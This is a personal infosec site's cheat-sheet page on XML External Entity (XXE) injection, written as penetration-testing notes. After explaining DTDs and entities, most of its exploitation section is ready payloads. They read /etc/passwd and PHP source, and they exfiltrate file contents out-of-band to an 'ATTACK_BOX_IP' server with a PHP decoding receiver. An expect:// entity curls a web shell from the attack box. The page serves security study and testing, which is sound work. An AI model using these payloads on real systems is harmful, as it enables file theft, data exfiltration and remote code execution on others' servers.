<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <title>ovelny - chaos/web-exploitation/XXE</title>
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta
      name="description"
      content="ovelny - notes on infosec, penetration testing, programming and others"
    />
    <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
    <link rel="stylesheet" type=text/css href="/assets/css/dead-simple.min.css">
    <link rel="stylesheet" type=text/css href="/assets/css/rouge.min.css">
    <link
      href="/atom.xml"
      rel="alternate"
      title="ovelny"
      type="application/atom+xml"
    />
    <script src="/assets/js/scramble-text.min.js" defer></script>
    <script src="/assets/js/zoom-images.min.js" defer></script>
    <meta name="twitter:card" content="summary"/>
    <meta name="twitter:site" content="@ovelny"/>
    <meta name="twitter:title" content="ovelny - chaos/web-exploitation/XXE"/>
    <meta name="twitter:image" content="https://ovelny.sh/assets/images/ovelny-logo.png"/>
    <meta name="twitter:image:alt" content="ovelny logo: 6 white circles grouped together forming a triangle shape, with a black background."/>
  </head>
  <body>

    <header>
      <section>
        <a href="/">
          <img
            class="logo"
            src="/assets/images/ovelny-pfp.png"
            alt="ovelny profile picture: a glitched picture of a three-eyed girl, staring intensely at the viewer."
          />
        </a>
        <h2><a class="ovelny" href="/">ovelny</a></h2>
      </section>
      <nav>
        <a href="/">home</a>
        <a href="/chaos/">chaos</a>
        <a href="/phasm/">phasm</a>
        <a href="/support/">support</a>
        <a href="/atom.xml" target="_blank" rel="noopener noreferrer">rss</a>
        <a href="/about/">about</a>
      </nav>
    </header>
    <main>

    
    <h1>XXE</h1>

<p>XML External Entity Injection (XXE) vulnerabilities occur when XML data from user input is improperly sanitized or parsed, which can allow us to leverage XML features to our advantage. the impact on the webapp and back-end server can be considerable and result in file disclosure, DoS and more.</p>

<h2>understanding XML DTDs</h2>

<p>XML Document Type Definition outlines the structure of an XML document to check if it passes those requirements. a basic example of an XML DTD looks like this:</p>

<div class="highlight"><pre class="highlight xml"><code><span class="cp">&lt;!DOCTYPE document [
  &lt;!ELEMENT document (author, date, recipients, content)&gt;</span>
  <span class="cp">&lt;!ELEMENT author (#PCDATA)&gt;</span>
  <span class="cp">&lt;!ELEMENT date (#PCDATA)&gt;</span>
  <span class="cp">&lt;!ELEMENT recipients (reviewer, coauthors?)&gt;</span>
  <span class="cp">&lt;!ELEMENT coauthors (coauthor*)&gt;</span>
  <span class="cp">&lt;!ELEMENT coauthor (#PCDATA)&gt;</span>
  <span class="cp">&lt;!ELEMENT content (#PCDATA)&gt;</span>
]&gt;
</code></pre></div>

<p><code>#PCDATA</code> denotes raw data. this DTD could validate the following XML document:</p>

<div class="highlight"><pre class="highlight xml"><code><span class="cp">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
<span class="nt">&lt;document&gt;</span>
  <span class="nt">&lt;author&gt;</span>John Doe<span class="nt">&lt;/author&gt;</span>
  <span class="nt">&lt;date&gt;</span>01-01-1980<span class="nt">&lt;/date&gt;</span>
  <span class="nt">&lt;recipients&gt;</span>
    <span class="nt">&lt;reviewer&gt;</span>scary_reviewer@email.com<span class="nt">&lt;/reviewer&gt;</span>
    <span class="nt">&lt;coauthors&gt;</span>
        <span class="nt">&lt;coauthor&gt;</span>Eve Doe<span class="nt">&lt;/coauthor&gt;</span>
        <span class="nt">&lt;coauthor&gt;</span>Mallory Doe<span class="nt">&lt;/coauthor&gt;</span>
    <span class="nt">&lt;/coauthors&gt;</span>
  <span class="nt">&lt;/recipients&gt;</span>
  <span class="nt">&lt;content&gt;</span>
  huge paper here.
  <span class="nt">&lt;/content&gt;</span> 
<span class="nt">&lt;/document&gt;</span>
</code></pre></div>

<p>a XML DTD can be stored within the XML document (below the XML declaration in first line), or in an external file, which is then called with the <code>SYSTEM</code> keyword such as <code>&lt;!DOCTYPE document SYSTEM &quot;document.dtd&quot;&gt;</code>. this line should also land below the XML declaration. you can also call the DTD through a URL instead of a local file. surely we can guess where we might be going with this.</p>

<h2>understanding XML entities</h2>

<p>XML entities are essentially XML variables, used to avoid repetition and needless refactoring. they can be defined in a DTD like this:</p>

<div class="highlight"><pre class="highlight xml"><code><span class="cp">&lt;!DOCTYPE document [
  &lt;!ENTITY disclaimer system "http://localhost/disclaimer.txt"&gt;</span>
  <span class="cp">&lt;!ENTITY localdisclaimer system "file:///usr/share/company/disclaimer.txt"&gt;</span>
  <span class="c">&lt;!-- SNIP --&gt;</span>
]&gt;
</code></pre></div>

<p>if we reference any of those entities in our XML document with the <code>&amp;disclaimer;</code> notation, they will be replaced by <code>disclaimer.txt</code>.</p>

<h2>exploitation</h2>

<p>if XML data from user input is improperly sanitized, we can create new entities and have them disclose local files for us, and more.</p>

<h3>testing for XXE</h3>

<p>to confirm the vulnerability, we can intercept a request sending XML data with our input, create a XML entity during interception, then send it and see if it gets reflected with its value, indicating XML injection.</p>

<p>for example, we might add this below the XML declaration during interception:</p>

<div class="highlight"><pre class="highlight xml"><code><span class="c">&lt;!-- XML declaration here --&gt;</span>
<span class="cp">&lt;!DOCTYPE document [
  &lt;!ENTITY entitytest "vulnerable"&gt;</span>
]&gt;
<span class="c">&lt;!-- rest of XML document with "&amp;entitytest;" added somewhere --&gt;</span>
</code></pre></div>

<p>if <code>&amp;entitytest;</code> gets reflected as <code>vulnerable</code>, our entity got interpreted and we can try to disclose local files.</p>

<p>if the webapp is using JSON, we can still try for XXE by changing the <code>Content-Type</code> header to <code>application/xml</code> and convert our JSON to XML, as the application might be accepting other formats.</p>

<h3>disclosing local files</h3>

<p>we can modify our payload above to read arbitrary files:</p>

<div class="highlight"><pre class="highlight xml"><code><span class="c">&lt;!-- XML declaration here --&gt;</span>
<span class="cp">&lt;!DOCTYPE document [
  &lt;!ENTITY hack SYSTEM "file:///etc/passwd"&gt;</span>
]&gt;
<span class="c">&lt;!-- rest of XML document with "&amp;hack;" added somewhere --&gt;</span>
</code></pre></div>

<h3>disclosing source code</h3>

<p>reading the webapp&#39;s source code can reveal additional vulnerabilities, too. we can&#39;t simply use <code>file://</code> this time, because special characters could break the entity reference and not conform to the XML format.</p>

<p>if the web server uses PHP, we can leverage PHP filters to encode a file contents into base64, which wouldn&#39;t break anything:</p>

<div class="highlight"><pre class="highlight xml"><code><span class="c">&lt;!-- XML declaration here --&gt;</span>
<span class="cp">&lt;!DOCTYPE document [
  &lt;!ENTITY hack SYSTEM "php://filter/convert.base64-encode/resource=index.php"&gt;</span>
]&gt;
<span class="c">&lt;!-- rest of XML document with "&amp;hack;" added somewhere --&gt;</span>
</code></pre></div>

<h3>CDATA file exfiltration</h3>

<p>previous examples are very straightforward and rarely seen. disclosing local files usually requires advanced methods, like leveraging <code>CDATA</code> tags: anything wrapped within these tags is considered as raw data, and would not break the XML format.</p>

<p>in theory, we want to wrap our desired file like the following:</p>

<div class="highlight"><pre class="highlight xml"><code><span class="c">&lt;!-- XML declaration here --&gt;</span>
<span class="cp">&lt;!DOCTYPE document [
  &lt;!ENTITY begin "&lt;![CDATA["&gt;</span>
  <span class="cp">&lt;!ENTITY hack SYSTEM "file:///etc/passwd"&gt;</span>
  <span class="cp">&lt;!ENTITY end "]]&gt;</span>"&gt;
  <span class="cp">&lt;!ENTITY payload "&amp;begin;&amp;hack;&amp;end;"&gt;</span>
]&gt;
<span class="c">&lt;!-- rest of XML document with "&amp;payload;" added somewhere --&gt;</span>
</code></pre></div>

<p>but this wouldn&#39;t work in practice, as XML doesn&#39;t allow joining external and internal entities, which are respectively our <code>file</code> entity and the <code>CDATA</code> tags in this case.</p>

<p>to circumvent this, we can use XML parameter entities, denoted with the <code>%</code> character such as <code>%hack;</code>. they can only be used within a DTD, but if the DTD is linked externally in our vulnerable XML document, all of the entities are suddenly considered external and can be joined like above.</p>

<p>here&#39;s an example:</p>

<div class="highlight"><pre class="highlight xml"><code><span class="c">&lt;!--
* step 1: create a DTD in your attack box, such as `echo '&lt;!ENTITY payload "%begin;%hack;%end;"&gt;' &gt; payload.dtd`

* step 2: start a local webserver in your attack box, such as `python3 -m http.server 8080`

* step3: edit the vulnerable XML document with your DTD's entities, and call your external DTD like the following:
--&gt;</span>

<span class="c">&lt;!-- XML declaration here --&gt;</span>
<span class="cp">&lt;!DOCTYPE document [
  &lt;!ENTITY % begin "&lt;![CDATA["&gt;</span>
  <span class="cp">&lt;!ENTITY % hack SYSTEM "file:///etc/passwd"&gt;</span>
  <span class="cp">&lt;!ENTITY % end "]]&gt;</span>"&gt;
  <span class="cp">&lt;!ENTITY % payload SYSTEM "http://ATTACK_BOX_IP:8080/payload.dtd"&gt;</span>
  %payload;
]&gt;
<span class="c">&lt;!-- rest of XML document with "&amp;payload;" added somewhere --&gt;</span>
</code></pre></div>

<h3>error-based XXE</h3>

<p>if our injection isn&#39;t reflected by the webapp, we are performing blind XXEs and need another way of extracting data from our payloads. for this purpose, we might leverage runtime errors from the programming language used by the web server, if XML input exceptions haven&#39;t been handled properly.</p>

<p>first, create a DTD on your attack box that resembles to this one:</p>

<div class="highlight"><pre class="highlight xml"><code><span class="cp">&lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;</span>
<span class="cp">&lt;!ENTITY % error "&lt;!ENTITY content SYSTEM '%missingEntity;/%file;'&gt;</span>"&gt;
</code></pre></div>

<p>host this DTD with a local webserver as above, and call it in our request:</p>

<div class="highlight"><pre class="highlight xml"><code><span class="cp">&lt;!DOCTYPE document [
  &lt;!ENTITY % payload SYSTEM "http://ATTACK_BOX_IP:8080/payload.dtd"&gt;</span>
  %payload;
  %error;
]&gt;
<span class="c">&lt;!-- rest of XML document --&gt;</span>
</code></pre></div>

<p>calling this DTD will trigger an error because of the <code>%missingEntity;</code>, and append the content of <code>%file;</code> to the runtime error to reveal its contents. this is however less reliable and can be prone to breakage with special characters, as well as suffering from length limitations.</p>

<h3>complete out-of-band data exfiltration</h3>

<p>our previous examples use OOB to get files contents, but what if nothing is reflected on the webapp, not even runtime errors? in that scenario, we can leverage OOB even further, and make the webapp send a web request to our local server.</p>

<p>in our working directory, host the following <code>oob.dtd</code> DTD:</p>

<div class="highlight"><pre class="highlight xml"><code><span class="cp">&lt;!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"&gt;</span>
<span class="cp">&lt;!ENTITY % oob "&lt;!ENTITY content SYSTEM 'http://ATTACK_BOX_IP:8000/?b64=%file;'&gt;</span>"&gt;
</code></pre></div>

<p>this will get <code>/etc/passwd</code> contents in the <code>?b64</code> GET parameter, encoded in base64. to automatically decode it, add the following <code>index.php</code> file in our working directory:</p>

<div class="highlight"><pre class="highlight php"><code><span class="cp">&lt;?php</span>
<span class="k">if</span><span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'b64'</span><span class="p">])){</span>
    <span class="nb">error_log</span><span class="p">(</span><span class="s2">"</span><span class="se">\n\n</span><span class="s2">"</span> <span class="mf">.</span> <span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'b64'</span><span class="p">]));</span>
<span class="p">}</span>
<span class="cp">?&gt;</span>
</code></pre></div>

<p>start the PHP server with <code>php -S 0.0.0.0:&lt;PORT&gt;</code> and send the following request to our target&#39;s webapp:</p>

<div class="highlight"><pre class="highlight xml"><code><span class="cp">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
<span class="cp">&lt;!DOCTYPE document [ 
  &lt;!ENTITY % remote SYSTEM "http://ATTACK_BOX_IP:PORT/oob.dtd"&gt;</span>
  %remote;
  %oob;
]&gt;
<span class="nt">&lt;root&gt;</span><span class="ni">&amp;content;</span><span class="nt">&lt;/root&gt;</span>
</code></pre></div>

<p>the file contents should get exfiltrated and properly decoded.</p>

<h3>remote code execution</h3>

<p>if our XXE is reflected and PHP is used on the target, we can directly confirm RCE with the PHP <code>expect</code> filter. it might not be installed or enabled but it&#39;s still worth a shot:</p>

<div class="highlight"><pre class="highlight xml"><code><span class="c">&lt;!-- XML declaration here --&gt;</span>
<span class="cp">&lt;!DOCTYPE document [
  &lt;!ENTITY hack SYSTEM "expect://id"&gt;</span>
]&gt;
<span class="c">&lt;!-- rest of XML document with "&amp;hack;" added somewhere --&gt;</span>
</code></pre></div>

<p>if <code>expect</code> is working, we can upload a shell to freely execute commands:</p>

<div class="highlight"><pre class="highlight xml"><code><span class="c">&lt;!-- XML declaration here --&gt;</span>
<span class="cp">&lt;!DOCTYPE document [
  &lt;!ENTITY hack SYSTEM "expect://curl$IFS-O$IFS'ATTACK_BOX_IP/shell.php'"&gt;</span>
]&gt;
<span class="c">&lt;!-- rest of XML document with "&amp;hack;" added somewhere --&gt;</span>
</code></pre></div>

<p><code>$IFS</code> is used instead of spaces to keep a valid XML syntax.</p>

<h3>automated tools</h3>

<p>see <a href="https://ovelny.sh/chaos/tool-cheat-sheets/XXEinjector/" rel="nofollow">XXEinjector</a> cheatsheet for an automated process.</p>

<h2>references</h2>

<ul>
<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection" rel="nofollow">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection</a></li>
<li><a href="https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity" rel="nofollow">https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity</a></li>
</ul>

    
    </main>
    <footer id="footer">
      <div class="footer-section"><a href="/license/">CC BY-NC-SA 4.0</a><p>&nbsp;::&nbsp;2019 - 2025 ovelny</p></div>
      <div class="footer-section">「七転び八起き」</div>
    </footer>
  </body>
</html>

